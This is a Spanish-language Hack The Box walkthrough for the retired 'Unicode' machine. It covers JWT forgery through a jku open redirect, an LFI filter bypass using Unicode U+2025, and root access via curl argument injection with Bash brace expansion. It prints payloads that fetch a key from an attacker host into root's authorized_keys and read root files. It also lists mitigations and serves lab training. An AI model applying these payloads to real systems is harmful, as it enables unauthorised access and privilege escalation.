---
machine: Unicode
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, jwt, jku, open-redirect, traversal, pyinstaller, privesc]
---

# Unicode — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El panel usa JWT RS256 y confía en la cabecera `jku`. Un open redirect en `/redirect/?url=` combinado con `static/../redirect` permite servir un `jwks.json` propio y forjar un token de administrador. El panel tiene un LFI en `display/?page=` que filtra `../`, pero `U+2025` se normaliza a `..` y permite leer `app.py` y `db.yaml`. Con las credenciales de `code` se llega a un binario PyInstaller ejecutado con sudo, vulnerable a inyección de parámetros en `curl` mediante brace expansion.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH y `80` nginx con uWSGI/Flask.
- `hackmedia.htb` ofrece login, dashboard y un endpoint `/redirect`.
- El JWT incluye `jku: http://hackmedia.htb/static/jwks.json`.

## Enumeración

Se decodifica el JWT y se comprueba que la firma se valida con la clave publicada en `jku`. Cambiar `jku` por un host propio no funciona; el servidor exige que empiece por `hackmedia.htb/static`. El open redirect permite encadenar `http://hackmedia.htb/static/../redirect/?url=<IP>/jwks.json`.

## Foothold

Se genera un par RSA, se publica el `jwks.json` y se firma un token con `user=admin`. Con la cookie resultante se accede al dashboard. La app tiene `display/?page=`; el filtro bloquea `../`, pero `U+2025` (`‥`) se normaliza después a `..` y permite leer `app.py` y `db.yaml`.

```bash
openssl genrsa -out priv.pem 2048
openssl rsa -in priv.pem -pubout -out pub.pem
```

## Movimiento lateral

`db.yaml` contiene las credenciales de `code`, que funcionan por SSH. En su home se encuentra `/usr/bin/treport`, un binario de PyInstaller que se ejecuta con sudo.

## Escalada de privilegios

`treport` ofrece crear, leer y descargar informes. La opción de descarga construye `/bin/bash -c "curl <input> -o /root/reports/..."` y filtra espacios, `;`, `|` y palabras como `file`. La brace expansion de Bash evita el filtro: `{http://<IP>/x,-o,/root/.ssh/authorized_keys}` se expande en dos argumentos y escribe la clave en root. También se puede usar `{fiLe:///root/root.txt,-o-}` para leer la flag.

```bash
sudo /usr/bin/treport
# opción 3: {http://<IP>/authorized_keys,-o,/root/.ssh/authorized_keys}
```

## Evidencia

- JWT con `jku` propio aceptado tras el open redirect.
- `app.py` y `db.yaml` leídos con `U+2025`.
- `treport` identificado como PyInstaller.
- Brace expansion escribiendo en `/root/.ssh/authorized_keys`.

## Lecciones aprendidas

- Validar `jku` por prefijo no basta si hay un open redirect en ese prefijo.
- Los filtros de traversal deben aplicarse tras la normalización Unicode.
- PyInstaller no protege el código; se puede extraer y descompilar.
- Los filtros de caracteres no cubren la expansión de llaves de Bash.

## Mitigación y detección

- Fijar las claves permitidas y no aceptar `jku` del token.
- Normalizar a NFKC antes de validar rutas y usar listas blancas.
- Evitar `bash -c` con entrada del usuario; usar `execve` con argumentos.
- Auditar ejecuciones de `treport` y escrituras en claves SSH de root.

## Referencias

- [0xdf — Unicode](https://0xdf.gitlab.io/2022/05/07/htb-unicode.html)
- [IppSec — Unicode](https://www.youtube.com/watch?v=2mH6Ri7EAq0)
- [Hack The Box — Unicode](https://app.hackthebox.com/machines/unicode)
